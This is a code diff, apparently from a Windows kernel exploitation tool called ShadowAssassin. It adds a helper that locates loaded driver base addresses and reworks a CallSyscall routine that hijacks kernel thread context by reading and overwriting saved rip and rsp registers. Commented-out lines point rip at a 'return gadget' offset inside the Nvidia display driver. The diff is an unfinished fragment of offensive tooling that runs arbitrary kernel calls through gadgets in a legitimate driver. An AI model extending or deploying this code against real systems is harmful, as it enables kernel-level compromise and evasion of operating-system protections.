@@ -120,6 +120,24 @@ UINT64 ShadowAssassin::GetCurrentEPROCESS(UINT64 eprocess)
 
 // --- Syscall dispatch ---
 
+
+
+
+
+UINT64 ShadowAssassin::GetModuleBaseAddress(const char* targetName) {
+    LPVOID drivers[1024]; DWORD cbNeeded;
+    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
+        for (int i = 0; i < (cbNeeded / sizeof(drivers[0])); i++) {
+            char szDriver[256];
+            if (GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver)) && _stricmp(szDriver, targetName) == 0) {
+                return (UINT64)drivers[i];
+            }
+        }
+    }
+    return 0;
+}
+
+
 UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UINT64>& params) {
 
     UINT64 funcAddr = ResolveKernelExport(name);
@@ -138,8 +156,29 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
     }
     DbgLog("[CallSyscall] frameBase=0x%llX\n", frameBase);
 
-    frameManager.WriteRegister("rip", 0x1337);
+    UINT64 nvidia_base = GetModuleBaseAddress("nvlddmkm.sys");
+    UINT64 ntso_base = GetModuleBaseAddress("ntoskrnl.exe");
+    printf("[CallSyscall] nvidia base: %llx. ntso base: %llx\n", nvidia_base, ntso_base);
 
+    if (nvidia_base == 0) {
+        printf("[CallSyscall] Nvidia Driver not loaded! Load it! Press enter to continue anyways or cntrl c to stop.\n ");
+        getchar();
+    }
+
+
+    UINT64 old_rsp = frameManager.ReadRegister("rsp"); // testing to shift the stack
+
+    printf("[Callsys] Old RSP: %llx", old_rsp);
+
+    //frameManager.WriteRegister("rsp", old_rsp + 0x58); //shifting stack forward so we can skip function
+
+    //frameManager.WriteRegister("rip", nvidia_base + 0x60ea0d); // return gadget
+
+
+
+
+    UINT64 starting_rip = frameManager.ReadRegister("rip");
+    printf("[CallSyscall] Current RIP before starting thread: %llx\n", starting_rip);
 
     Sleep(100);
 	__debugbreak();
